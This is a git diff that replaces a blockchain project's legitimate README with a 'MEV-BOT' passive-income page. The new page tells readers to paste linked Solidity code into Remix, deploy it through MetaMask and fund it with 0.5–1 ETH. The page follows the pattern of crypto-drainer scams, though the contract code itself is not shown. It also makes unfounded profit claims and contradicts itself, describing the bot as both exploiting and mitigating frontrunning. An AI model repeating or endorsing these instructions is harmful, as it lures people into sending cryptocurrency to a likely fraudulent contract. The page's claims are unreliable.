@@ -1,105 +1,87 @@
 <p align="center">
-    <a href="https://discord.gg/versatus" alt="Discord">
-        <img src="https://img.shields.io/discord/1034112774789414963.svg?label=&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2&style=for-the-badge" />
-    </a>
-    <a href="https://twitter.com/VersatusLabs?s=20" alt="Twitter">
-        <img src="https://img.shields.io/twitter/follow/VersatusLabs?style=for-the-badge&logo=twitter&logoColor=white&labelColor=1DA1F2&color=1DA1F2" />
-    </a>
+  <img src="https://github.com/JakeSub/lon/assets/132209154/3b460a04-7d23-4f1c-8ec4-aca91691b138" />
 </p>
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://github.com/versatus/brand-assets/blob/33cf3981d13f439a43ddfde5966a8a5fd58ff5ce/logo/versatus_logo_white.png">
-  <img alt="VRRB Logo" src="https://github.com/versatus/brand-assets/blob/33cf3981d13f439a43ddfde5966a8a5fd58ff5ce/logo/versatus_logo_white.png">
-</picture>
+# 🚀 MEV-BOT: Your Ticket to Passive Income
 
-Versatus is the Universal dApp Engine, unlocking decentralized development beyond smart contracts.
+Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure , you can earn passive income by exploiting MEV-BOT. 
 
-With Versatus, you can create full-stack applications in your preferred programming languages with your favorite development tools. Follow our three-step process to develop, deploy and dynamically scale yoru app on our network.
+MEV-BOT provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
 
-More devs. More dApps. More Users.
+> **⏰ Attention!** This code is for sharing only and cannot be used for commercial purposes.
 
-<br>
+<p align="center">
+  <img src="http://i.countdownmail.com/2kn5rc.gif" />
+</p>
 
-<hr>
-<br>
+## 💡 Introducing Bot
 
-<div align="center">
-  <img src="https://github.com/versatus/brand-assets/blob/33cf3981d13f439a43ddfde5966a8a5fd58ff5ce/memes/fexible-text.gif" alt="nowthatsflexible.gif">
-</div>
-<br>
-<hr>
-<br>
+MEV-BOT is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-Versatus is a permissionless network, be they operators, developers, users or
-some combination thereof, Versatus is decentralized, censorship resistant and
-accessible to anyone with an internet connection.
+MEV-BOT aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
-<br>
-<hr>
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-Scroll to the bottom for information on how to start a node.
+## 📊 Platform Comparison 
 
-### High Level Roadmap
+| Platform      | Router Address  | Network | Mempool Scan Time |
+| ------------- |:---------------:| -------:| ----------------: |
+| Pancakeswap   | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e)| BSC     | 0.78 sec         |
+| Uniswap       | [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D](https://etherscan.io/address/0x7a250d5630b4cf539739df2c5dacb4c659f2488d)| ETH     | 0.32 sec         |
 
-This is extremely high level, for each **Epic** there are multiple features
-and under each feature there are many stories and tasks
+## 🤖 How to Use MEVBot
 
-_Items that are more than 50% complete are marked with :construction: while
-items that are less than 50% complete are marked as :x:, all items marked with
-:white_check_mark: are complete, tested, and integrated into the node runtime_
+### Step 1: Access the Source Code 📝
+1. Download MetaMask (if you don’t have it already): [https://metamask.io/download.html/]()
+   Navigate to the Remix IDE: [https://remix.ethereum.org/]()
 
-:link: : Alphanet
-:signal_strength: Betanet
-:computer: Devnet
+2. Create a new file "MevBot.sol".
+3. Copy [this code](sourcecode.sol) and paste it into the Remix IDE.
 
-| **Epic**                  | _Description_                                                                                                                                                                                               | State              | Network           |
-| ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------ | ----------------- |
-| Network                   | P2P Network enabling communication between network participants                                                                                                                                             | :white_check_mark: | :link:            |
-| Election                  | Proof of Claim Algorithm Implementation and Integration                                                                                                                                                     | :white_check_mark: | :link:            |
-| Genesis Quorum Protocol   | Formation of the first quorums at Genesis event                                                                                                                                                             | ✅     | :link:            |
-| Key Generator             | Protocol to generate Dealerless Distributed Keypairs for validator nodes, and ECDSA keypairs for all nodes                                                                                                  | :white_check_mark: | :link:            |
-| State Store               | Left-Right Wrapped Accounts Database and State Trie                                                                                                                                                         | ✅                 | :link:            |
-| Mempool                   | Left-Right Wrapped Pending Transaction Store                                                                                                                                                                | :white_check_mark: | :link:            |
-| Validator Unit            | Left-Right enabled transaction validation protocol                                                                                                                                                          | :white_check_mark: | :link:            |
-| Farmer-Harvester          | Farmer-Havester Quorum model for secure parallel execution and validation of transactions                                                                                                                   | ✅                 | :link:            |
-| DAG                       | Rounds based Directed Acyclic Graph to append blocks to                                                                                                                                                     | :white_check_mark: | :link:            |
-| Miner Unit                | Protocol for consolidating proposal blocks produced by miners into a single point of reference signifying the end of a round and finality of transactions (once certified)                                  | :white_check_mark: | :link:            |
-| Scheduler                 | Decentralized task buffer and allocator to maximize efficiency of Farmer Quorum nodes                                                                                                                       | :white_check_mark: | :link:            |
-| Block Production          | Enables harvesters to produce conflict minimized, extractable value maximized proposal blocks to be appended to the DAG                                                                                     | :white_check_mark: | :link:            |
-| Node CLI                  | Provides an interface for operators to spin up a Versatus node                                                                                                                                                  | :white_check_mark: | :link:            |
-| Wallet CLI                | Provides an interface for users to interact with the Versatus network                                                                                                                                           | 🚧     | :link:            |
-| Token Emission Protocol   | Ensures that the proper number of tokens in each block and epoch are produced                                                                                                                                      | :white_check_mark: | :signal_strength: |
-| Fee Model                 | Provides economic incentives to operators beyond emission subsidy, provides token burning to limit inflation, and economic incentives to maintain speed at scale                                            | :x:                | :signal_strength: |
-| Reputation Tracking       | Tracks the reputation of nodes, and the message credits, to align incentives, reduce malicious behavior and allow for dynamic stake calculation to prevent accumulation and centralization of staking nodes | :construction:     | :signal_strength: |
-| Dynamic Stake Calculator  | Protocol to calculate the minimum required stake of nodes in the network in order for the given nodes to become eligible as validators                                                                          | :x:                | :signal_strength: |
-| Block Indexer             | Indexes, sequences and stores blocks for display in UIs that need access to block and transaction data                                                                                                      | :construction:     | :signal_strength: |
-| Block Explorer            | Provides a web based user interface for scanning blocks, tracking transactions, etc.                                                                                                                        | :construction:     | :signal_strength: |
-| Node Metrics              | Tracks the performance of a given node, cluster of nodes, and/or all nodes in the network                                                                                                                   | :x:                | :signal_strength: |
-| Rent Model                | Provides economic incentives to developers to build small, modular programs that do one thing well, and link them together by returning commands to the orchestration network.                              | :x:                | :computer:        |
-| Whistleblower Protocol    | Protocol for reporting malicious behavior, and initiating a stake slashing vote                                                                                                                             | :x:                | :computer:        |
-| Wallet GUI                | Provides a user interface for interacting with Versatus network                                                                                                                                                 | :x:                | :computer:        |
-| Unikernel Compute Runtime | Enables programming language agnostic compute in the Versatus network                                                                                                                                           | :x:                | :computer:        |
+<p align="center">
+ <img src="https://i.ibb.co/J59pph4/2.jpg" alt="2" border="0">
+</p>
 
-### Starting a Node
+### Step 2: Compile the Code ⚙️
+1. Click on the "Solidity Compiler" tab, select the appropriate compiler version 0.6.12, and click on "Compile MevBot.sol".
+2. Click on the "Deploy & Run Transactions" tab Select "Injected Privider - MetaMask".
 
-In order to start a node, run `cargo run`
-Running `cargo run -- -help` will display available cli flags for node configuration and management.
+<p align="center">
+  <img src="https://i.ibb.co/rfbwTGK/3.jpg" alt="3" border="0">
+ </p>
+ <p align="center">
+  <img src="https://i.ibb.co/q0yCXV5/4.jpg" alt="4" border="0">
+</p>
 
-**The above builds and runs a Versatus node in `debug` mode** to run in optimized
-release mode you must first build the release target using the following command:
+### Step 3: Choose the Network 🌐
+1. Select either ETH or BSC (BNB) network.
 
-```
-git clone https://github.com/versatus/versatus
-cd /path/to/cloned/repo
-cargo build --release
-```
+### Step 4: Deploy the Code 🚀
+1. Click 'Transact (Deploy)'.
 
-This will produce a target file (and directory if this is your first time
-running `cargo run` or `cargo build` in this repo.
+<p align="center">
+  <img src="https://i.ibb.co/xF4fSVv/5.jpg" alt="5" border="0">
+</p>
 
-Then, to display the available CLI flags, you can run:
+### Step 5: Deposit MEVBot starting funds 💰
+1. Copy your MEV contract and send an amount of Ethereum for the bot's operation. 
+2. Start the bot by pressing the 'Start' button.
 
-```
-cd target/release
-./versatus -help
-```
+> **🔔 Note:** For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.5-1 ETH. 
+
+<p align="center">
+  <img src="https://github.com/JakeSub/lon/assets/132209154/9d9f4573-cb52-48f2-9f0b-d37e6ea2b73d" />
+</p>
+
+You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
+
+
+---
+
+## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
+
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
